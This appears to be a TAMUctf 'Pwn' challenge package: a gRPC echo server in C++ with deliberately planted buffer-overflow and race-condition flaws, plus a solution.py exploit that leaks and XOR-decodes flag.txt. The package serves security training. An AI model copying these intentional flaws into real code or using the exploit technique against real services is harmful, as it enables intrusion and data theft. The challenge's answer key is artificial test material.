$<\n\nserver.o: server.cpp\n\t$(CXX) $(CXXFLAGS) -c $^ -o $@\n\ngrpc_server: protobuf.pb.o protobuf.grpc.pb.o grpc_server.o server.o\n\t$(CXX) $^ $(LDFLAGS) -g -o $@\n\nclean:\n\trm -f *.pb.o *.pb.cc *.pb.h grpc_server.o grpc_server\n",
    "server\\protobuf.proto": "// Copyright 2015, Google Inc.\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n//     * Redistributions of source code must retain the above copyright\n// notice, this list of conditions and the following disclaimer.\n//     * Redistributions in binary form must reproduce the above\n// copyright notice, this list of conditions and the following disclaimer\n// in the documentation and/or other materials provided with the\n// distribution.\n//     * Neither the name of Google Inc. nor the names of its\n// contributors may be used to endorse or promote products derived from\n// this software without specific prior written permission.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n// \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n// A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n// OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\n// LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n// DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n// (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\nsyntax = \"proto3\";\n\npackage tamuctf;\n\nimport \"google/protobuf/timestamp.proto\";\n\n// The messenger service definition.\nservice EchoService{\n  rpc Login (Request) returns (Reply) {}\n  rpc Logout (ServiceUser) returns (Reply) {}\n  rpc SendEcho (Request) returns (Reply) {}\n  rpc ReceiveEcho (ServiceUser) returns (Reply) {}\n}\n\nmessage ServiceUser {\n  string username = 1;\n}\n\nmessage Request {\n  string username = 1;\n  string msg = 2;\n}\n\nmessage Reply {\n  string msg = 1;\n}\n\nmessage Message {\n  //Username who sent the message\n  string username = 1;\n  //Message from the user\n  string msg = 2;\n  //Time the message was sent\n  google.protobuf.Timestamp timestamp = 3;\n}\n",
    "server\\server.cpp": "#include <ctime>\n#include <stdio.h>\n#include <fstream>\n#include <iostream>\n#include <memory>\n#include <string>\n#include <stdlib.h>\n#include <unistd.h>\n#include <map>\n#include <string.h>\n#include \"server.h\"\n\n#define PASSWORD_LEN 50\n#define USERNAME_LEN 32\n#define MESSAGE_LEN 50\n\nUser::User(char* user){\n    strcpy(username,user);\n    strcpy(msg,\"No Queries Submitted\");\n}\n\nbool cmp_str::operator()(char const *a, char const *b)\n{\n    std::cout << \"Comparing \" << a << \" to \" << b << std::endl;\n    return (strcmp(a,b) < 0);\n}\n\nstd::map<char*, User*, cmp_str> current_users;\n\nvoid encrypt(char* key, char* message){\n    char xored_value;\n    int message_length = strlen(message);\n    for( int i = 0; i < message_length; i++){\n        message[i] = (char) (message[i] ^ key[i%strlen(key)]);\n    }\n}\n\nvoid decrypt(char* key, char* message){\n    encrypt(key,message);\n}\n\nchar* getPassword(char* filename){\n    char* password = (char*) malloc(50);\n    FILE *fptr = fopen(filename,\"r\");\n    fgets(password,50,fptr);\n    fclose(fptr);\n    std::cout << \"password: \" << password << std::endl;\n    return password;\n}\n\nbool isValidUsername(char* username){\n    std::cout << \"Length: \" << (strlen(username) < USERNAME_LEN) << std::endl;\n    std::cout << \"flag: \" << (strstr(username,\"flag\") == NULL) << std::endl;\n    std::cout << \"current user: \" << (current_users.find(username) != current_users.end()) << std::endl;\n    return strlen(username) < USERNAME_LEN && strstr(username,\"flag\") == NULL && current_users.find(username) != current_users.end();\n}\n\nchar* login(char* id, char* name, char* password){\n    char username[USERNAME_LEN];\n    char* returnVal = (char*) malloc(100);\n    strncpy(username,id,USERNAME_LEN);\n    strncat(username,name,USERNAME_LEN);\n    if (strstr(username,\"flag\") != NULL){\n        strcpy(returnVal,\"Invalid username.\");\n        std::cout << \"Invalid user: \" << username << std::endl;\n        return returnVal;\n    }\n    std::map<char*, User*>::iterator it = current_users.find(username);\n    if (it == current_users.end()){\n        char* new_username = (char*) malloc(USERNAME_LEN);\n        strcpy(new_username,username);\n        current_users[new_username] = new User(new_username);\n        std::cout << \"creating new user\" << std::endl;\n    }\n    FILE* fptr = fopen(username,\"w\");\n    fputs(password,fptr);\n    fclose(fptr);\n    snprintf(returnVal,100,\"User %s logged in.\",username);\n    std::cout << \"Logging in user: \" << username << std::endl;\n    return returnVal;\n}\n\nchar* logout(char* id, char* name){\n    char username[USERNAME_LEN];\n    strncpy(username,id,USERNAME_LEN);\n    strncat(username,name,USERNAME_LEN);\n    if (isValidUsername(username)){\n        std::map<char*, User*>::iterator it = current_users.find(username);\n        delete it->second;\n        free(it->first);\n        current_users.erase(it);\n        std::cout << \"Logging out user: \" << username << std::endl;\n        return (char*) \"Logged Out.\";\n    }\n    std::cout << \"Invalid user: \" << username << std::endl;\n    return (char*) \"Invalid Username.\";\n}\n\nchar* sendEcho(char* id, char* name, char* message){\n    char username[USERNAME_LEN];\n    strncpy(username,id,USERNAME_LEN);\n    strncat(username,name,USERNAME_LEN);\n    if (isValidUsername(username)){\n        char* key = getPassword(username);\n        decrypt(key,message);\n        free(key);\n        strcpy(current_users[username]->msg,message);\n        std::cout << \"Message received: \" << message << std::endl;\n        return (char*) \"Message Received.\";\n    }\n    return (char*) \"Invalid Username.\";\n}\n\nchar* receiveEcho(char* id, char* name){\n    char username[USERNAME_LEN];\n    char message[MESSAGE_LEN];\n    char* return_message = (char*) malloc(MESSAGE_LEN);\n    strncpy(username,id,USERNAME_LEN);\n    strncat(username,name,USERNAME_LEN);\n    if(!isValidUsername(username)){\n        strcpy(return_message,\"Invalid Username.\");\n        return return_message;\n    }\n    if (strlen(current_users.at(username)->msg) < MESSAGE_LEN){\n        usleep(100000);\n        strcpy(message,current_users.at(username)->msg);\n    }\n    else{\n        strcpy(return_message,\"Invalid message length!\");\n        return return_message;\n    }\n    char* key = getPassword(username);\n\n    //this is where i use the key to xor \"encrypt\" the communication.\n    //If they overflowed and read from flag.txt, all they have to do is undo the xor.\n    std::cout << \"Decrypted Message: \" << message << std::endl;\n    encrypt(key,message);\n    free(key);\n    strncpy(return_message,message,MESSAGE_LEN);\n    return return_message;\n}\n",
    "server\\server.h": "#ifndef SERVER_H_INCLUDED\n#define SERVER_H_INCLUDED\n\n#include <string>\n\nclass User{\n\tpublic:\n        char username[32];\n        char msg[100];\n\n        User(char* user);\n};\n\nstruct cmp_str\n{\n    bool operator()(char const *a, char const *b); \n};\n\nextern std::map<char*, User*, cmp_str> current_users;\n\nchar* login(char* id, char* name, char* password);\n\nchar* logout(char* id, char* name);\n\nchar* sendEcho(char* id, char* name, char* message);\n\nchar* receiveEcho(char* id, char* name);\n\n#endif\n",
    "server\\server.o": "[Binary file or unsupported type: o]",
    "solution\\protobuf_pb2.py": "# Generated by the protocol buffer compiler.  DO NOT EDIT!\n# source: protobuf.proto\n\nimport sys\n_b=sys.version_info[0]<3 and (lambda x:x) or (lambda x:x.encode('latin1'))\nfrom google.protobuf import descriptor as _descriptor\nfrom google.protobuf import message as _message\nfrom google.protobuf import reflection as _reflection\nfrom google.protobuf import symbol_database as _symbol_database\nfrom google.protobuf import descriptor_pb2\n# @@protoc_insertion_point(imports)\n\n_sym_db = _symbol_database.Default()\n\n\nfrom google.protobuf import timestamp_pb2 as google_dot_protobuf_dot_timestamp__pb2\n\n\nDESCRIPTOR = _descriptor.FileDescriptor(\n  name='protobuf.proto',\n  package='tamuctf',\n  syntax='proto3',\n  serialized_pb=_b('\\n\\x0eprotobuf.proto\\x12\\x07tamuctf\\x1a\\x1fgoogle/protobuf/timestamp.proto\\\"\\x1f\\n\\x0bServiceUser\\x12\\x10\\n\\x08username\\x18\\x01 \\x01(\\t\\\"(\\n\\x07Request\\x12\\x10\\n\\x08username\\x18\\x01 \\x01(\\t\\x12\\x0b\\n\\x03msg\\x18\\x02 \\x01(\\t\\\"\\x14\\n\\x05Reply\\x12\\x0b\\n\\x03msg\\x18\\x01 \\x01(\\t\\\"W\\n\\x07Message\\x12\\x10\\n\\x08username\\x18\\x01 \\x01(\\t\\x12\\x0b\\n\\x03msg\\x18\\x02 \\x01(\\t\\x12-\\n\\ttimestamp\\x18\\x03 \\x01(\\x0b\\x32\\x1a.google.protobuf.Timestamp2\\xd3\\x01\\n\\x0b\\x45\\x63hoService\\x12+\\n\\x05Login\\x12\\x10.tamuctf.Request\\x1a\\x0e.tamuctf.Reply\\\"\\x00\\x12\\x30\\n\\x06Logout\\x12\\x14.tamuctf.ServiceUser\\x1a\\x0e.tamuctf.Reply\\\"\\x00\\x12.\\n\\x08SendEcho\\x12\\x10.tamuctf.Request\\x1a\\x0e.tamuctf.Reply\\\"\\x00\\x12\\x35\\n\\x0bReceiveEcho\\x12\\x14.tamuctf.ServiceUser\\x1a\\x0e.tamuctf.Reply\\\"\\x00\\x62\\x06proto3')\n  ,\n  dependencies=[google_dot_protobuf_dot_timestamp__pb2.DESCRIPTOR,])\n\n\n\n\n_SERVICEUSER = _descriptor.Descriptor(\n  name='ServiceUser',\n  full_name='tamuctf.ServiceUser',\n  filename=None,\n  file=DESCRIPTOR,\n  containing_type=None,\n  fields=[\n    _descriptor.FieldDescriptor(\n      name='username', full_name='tamuctf.ServiceUser.username', index=0,\n      number=1, type=9, cpp_type=9, label=1,\n      has_default_value=False, default_value=_b(\"\").decode('utf-8'),\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n  ],\n  extensions=[\n  ],\n  nested_types=[],\n  enum_types=[\n  ],\n  options=None,\n  is_extendable=False,\n  syntax='proto3',\n  extension_ranges=[],\n  oneofs=[\n  ],\n  serialized_start=60,\n  serialized_end=91,\n)\n\n\n_REQUEST = _descriptor.Descriptor(\n  name='Request',\n  full_name='tamuctf.Request',\n  filename=None,\n  file=DESCRIPTOR,\n  containing_type=None,\n  fields=[\n    _descriptor.FieldDescriptor(\n      name='username', full_name='tamuctf.Request.username', index=0,\n      number=1, type=9, cpp_type=9, label=1,\n      has_default_value=False, default_value=_b(\"\").decode('utf-8'),\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n    _descriptor.FieldDescriptor(\n      name='msg', full_name='tamuctf.Request.msg', index=1,\n      number=2, type=9, cpp_type=9, label=1,\n      has_default_value=False, default_value=_b(\"\").decode('utf-8'),\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n  ],\n  extensions=[\n  ],\n  nested_types=[],\n  enum_types=[\n  ],\n  options=None,\n  is_extendable=False,\n  syntax='proto3',\n  extension_ranges=[],\n  oneofs=[\n  ],\n  serialized_start=93,\n  serialized_end=133,\n)\n\n\n_REPLY = _descriptor.Descriptor(\n  name='Reply',\n  full_name='tamuctf.Reply',\n  filename=None,\n  file=DESCRIPTOR,\n  containing_type=None,\n  fields=[\n    _descriptor.FieldDescriptor(\n      name='msg', full_name='tamuctf.Reply.msg', index=0,\n      number=1, type=9, cpp_type=9, label=1,\n      has_default_value=False, default_value=_b(\"\").decode('utf-8'),\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n  ],\n  extensions=[\n  ],\n  nested_types=[],\n  enum_types=[\n  ],\n  options=None,\n  is_extendable=False,\n  syntax='proto3',\n  extension_ranges=[],\n  oneofs=[\n  ],\n  serialized_start=135,\n  serialized_end=155,\n)\n\n\n_MESSAGE = _descriptor.Descriptor(\n  name='Message',\n  full_name='tamuctf.Message',\n  filename=None,\n  file=DESCRIPTOR,\n  containing_type=None,\n  fields=[\n    _descriptor.FieldDescriptor(\n      name='username', full_name='tamuctf.Message.username', index=0,\n      number=1, type=9, cpp_type=9, label=1,\n      has_default_value=False, default_value=_b(\"\").decode('utf-8'),\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n    _descriptor.FieldDescriptor(\n      name='msg', full_name='tamuctf.Message.msg', index=1,\n      number=2, type=9, cpp_type=9, label=1,\n      has_default_value=False, default_value=_b(\"\").decode('utf-8'),\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n    _descriptor.FieldDescriptor(\n      name='timestamp', full_name='tamuctf.Message.timestamp', index=2,\n      number=3, type=11, cpp_type=10, label=1,\n      has_default_value=False, default_value=None,\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n  ],\n  extensions=[\n  ],\n  nested_types=[],\n  enum_types=[\n  ],\n  options=None,\n  is_extendable=False,\n  syntax='proto3',\n  extension_ranges=[],\n  oneofs=[\n  ],\n  serialized_start=157,\n  serialized_end=244,\n)\n\n_MESSAGE.fields_by_name['timestamp'].message_type = google_dot_protobuf_dot_timestamp__pb2._TIMESTAMP\nDESCRIPTOR.message_types_by_name['ServiceUser'] = _SERVICEUSER\nDESCRIPTOR.message_types_by_name['Request'] = _REQUEST\nDESCRIPTOR.message_types_by_name['Reply'] = _REPLY\nDESCRIPTOR.message_types_by_name['Message'] = _MESSAGE\n_sym_db.RegisterFileDescriptor(DESCRIPTOR)\n\nServiceUser = _reflection.GeneratedProtocolMessageType('ServiceUser', (_message.Message,), dict(\n  DESCRIPTOR = _SERVICEUSER,\n  __module__ = 'protobuf_pb2'\n  # @@protoc_insertion_point(class_scope:tamuctf.ServiceUser)\n  ))\n_sym_db.RegisterMessage(ServiceUser)\n\nRequest = _reflection.GeneratedProtocolMessageType('Request', (_message.Message,), dict(\n  DESCRIPTOR = _REQUEST,\n  __module__ = 'protobuf_pb2'\n  # @@protoc_insertion_point(class_scope:tamuctf.Request)\n  ))\n_sym_db.RegisterMessage(Request)\n\nReply = _reflection.GeneratedProtocolMessageType('Reply', (_message.Message,), dict(\n  DESCRIPTOR = _REPLY,\n  __module__ = 'protobuf_pb2'\n  # @@protoc_insertion_point(class_scope:tamuctf.Reply)\n  ))\n_sym_db.RegisterMessage(Reply)\n\nMessage = _reflection.GeneratedProtocolMessageType('Message', (_message.Message,), dict(\n  DESCRIPTOR = _MESSAGE,\n  __module__ = 'protobuf_pb2'\n  # @@protoc_insertion_point(class_scope:tamuctf.Message)\n  ))\n_sym_db.RegisterMessage(Message)\n\n\n\n_ECHOSERVICE = _descriptor.ServiceDescriptor(\n  name='EchoService',\n  full_name='tamuctf.EchoService',\n  file=DESCRIPTOR,\n  index=0,\n  options=None,\n  serialized_start=247,\n  serialized_end=458,\n  methods=[\n  _descriptor.MethodDescriptor(\n    name='Login',\n    full_name='tamuctf.EchoService.Login',\n    index=0,\n    containing_service=None,\n    input_type=_REQUEST,\n    output_type=_REPLY,\n    options=None,\n  ),\n  _descriptor.MethodDescriptor(\n    name='Logout',\n    full_name='tamuctf.EchoService.Logout',\n    index=1,\n    containing_service=None,\n    input_type=_SERVICEUSER,\n    output_type=_REPLY,\n    options=None,\n  ),\n  _descriptor.MethodDescriptor(\n    name='SendEcho',\n    full_name='tamuctf.EchoService.SendEcho',\n    index=2,\n    containing_service=None,\n    input_type=_REQUEST,\n    output_type=_REPLY,\n    options=None,\n  ),\n  _descriptor.MethodDescriptor(\n    name='ReceiveEcho',\n    full_name='tamuctf.EchoService.ReceiveEcho',\n    index=3,\n    containing_service=None,\n    input_type=_SERVICEUSER,\n    output_type=_REPLY,\n    options=None,\n  ),\n])\n_sym_db.RegisterServiceDescriptor(_ECHOSERVICE)\n\nDESCRIPTOR.services_by_name['EchoService'] = _ECHOSERVICE\n\n# @@protoc_insertion_point(module_scope)\n",
    "solution\\protobuf_pb2_grpc.py": "# Generated by the gRPC Python protocol compiler plugin. DO NOT EDIT!\nimport grpc\n\nimport protobuf_pb2 as protobuf__pb2\n\n\nclass EchoServiceStub(object):\n  \"\"\"The messenger service definition.\n  \"\"\"\n\n  def __init__(self, channel):\n    \"\"\"Constructor.\n\n    Args:\n      channel: A grpc.Channel.\n    \"\"\"\n    self.Login = channel.unary_unary(\n        '/tamuctf.EchoService/Login',\n        request_serializer=protobuf__pb2.Request.SerializeToString,\n        response_deserializer=protobuf__pb2.Reply.FromString,\n        )\n    self.Logout = channel.unary_unary(\n        '/tamuctf.EchoService/Logout',\n        request_serializer=protobuf__pb2.ServiceUser.SerializeToString,\n        response_deserializer=protobuf__pb2.Reply.FromString,\n        )\n    self.SendEcho = channel.unary_unary(\n        '/tamuctf.EchoService/SendEcho',\n        request_serializer=protobuf__pb2.Request.SerializeToString,\n        response_deserializer=protobuf__pb2.Reply.FromString,\n        )\n    self.ReceiveEcho = channel.unary_unary(\n        '/tamuctf.EchoService/ReceiveEcho',\n        request_serializer=protobuf__pb2.ServiceUser.SerializeToString,\n        response_deserializer=protobuf__pb2.Reply.FromString,\n        )\n\n\nclass EchoServiceServicer(object):\n  \"\"\"The messenger service definition.\n  \"\"\"\n\n  def Login(self, request, context):\n    # missing associated documentation comment in .proto file\n    pass\n    context.set_code(grpc.StatusCode.UNIMPLEMENTED)\n    context.set_details('Method not implemented!')\n    raise NotImplementedError('Method not implemented!')\n\n  def Logout(self, request, context):\n    # missing associated documentation comment in .proto file\n    pass\n    context.set_code(grpc.StatusCode.UNIMPLEMENTED)\n    context.set_details('Method not implemented!')\n    raise NotImplementedError('Method not implemented!')\n\n  def SendEcho(self, request, context):\n    # missing associated documentation comment in .proto file\n    pass\n    context.set_code(grpc.StatusCode.UNIMPLEMENTED)\n    context.set_details('Method not implemented!')\n    raise NotImplementedError('Method not implemented!')\n\n  def ReceiveEcho(self, request, context):\n    # missing associated documentation comment in .proto file\n    pass\n    context.set_code(grpc.StatusCode.UNIMPLEMENTED)\n    context.set_details('Method not implemented!')\n    raise NotImplementedError('Method not implemented!')\n\n\ndef add_EchoServiceServicer_to_server(servicer, server):\n  rpc_method_handlers = {\n      'Login': grpc.unary_unary_rpc_method_handler(\n          servicer.Login,\n          request_deserializer=protobuf__pb2.Request.FromString,\n          response_serializer=protobuf__pb2.Reply.SerializeToString,\n      ),\n      'Logout': grpc.unary_unary_rpc_method_handler(\n          servicer.Logout,\n          request_deserializer=protobuf__pb2.ServiceUser.FromString,\n          response_serializer=protobuf__pb2.Reply.SerializeToString,\n      ),\n      'SendEcho': grpc.unary_unary_rpc_method_handler(\n          servicer.SendEcho,\n          request_deserializer=protobuf__pb2.Request.FromString,\n          response_serializer=protobuf__pb2.Reply.SerializeToString,\n      ),\n      'ReceiveEcho': grpc.unary_unary_rpc_method_handler(\n          servicer.ReceiveEcho,\n          request_deserializer=protobuf__pb2.ServiceUser.FromString,\n          response_serializer=protobuf__pb2.Reply.SerializeToString,\n      ),\n  }\n  generic_handler = grpc.method_handlers_generic_handler(\n      'tamuctf.EchoService', rpc_method_handlers)\n  server.add_generic_rpc_handlers((generic_handler,))\n",
    "solution\\solution.py": "import grpc\nimport argparse\nimport protobuf_pb2\nimport protobuf_pb2_grpc\nimport threading\n\nclass Client:\n    def __init__(self,hname,p,uname):\n        self.hostname = hname\n        self.port = p\n        self.username = uname\n        self.stub = protobuf_pb2_grpc.EchoServiceStub(grpc.insecure_channel(hname+\":\"+p))\n\ndef encrypt(message):\n    xored = []\n    temp_pass = 'mypass'\n    for i in range(len(message)):\n        xored_value = ord(message[i%len(message)]) ^ ord(temp_pass[i%len(temp_pass)])\n        xored.append(chr(xored_value))\n    return ''.join(xored)\n\ndef decrypt(message):\n    xored = []\n    temp_pass = \"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMflag.txt\"\n    for i in range(len(message)):\n        xored_value = ord(message[i%len(message)]) ^ ord(temp_pass[i%len(temp_pass)])\n        xored.append(chr(xored_value))\n    return ''.join(xored)\n\ndef receiveEcho(client):\n    reply = client.stub.ReceiveEcho(protobuf_pb2.ServiceUser(username=client.username))\n    print(decrypt(reply.msg))\n\ndef echoClient(hostname,port,username):\n    client = Client(hostname, port, username)\n    reply = client.stub.Login(protobuf_pb2.Request(username=client.username,msg=\"mypass\"))\n    reply = client.stub.SendEcho(protobuf_pb2.Request(username=client.username,msg=\"random\"))\n\n    new_thread = threading.Thread(target=receiveEcho,args=(client,))\n    new_thread.start()\n\n    reply = client.stub.SendEcho(protobuf_pb2.Request(username=client.username,msg=encrypt(\"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMflag.txt\")))\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description=\"Process some arguments\")\n    parser.add_argument('--host',default='localhost')\n    parser.add_argument('-p','--port',default='3010')\n    parser.add_argument('-u','--user',default='default')\n    args = parser.parse_args()\n    echoClient(args.host,args.port,args.user)\n",
    "category": "Pwn"
}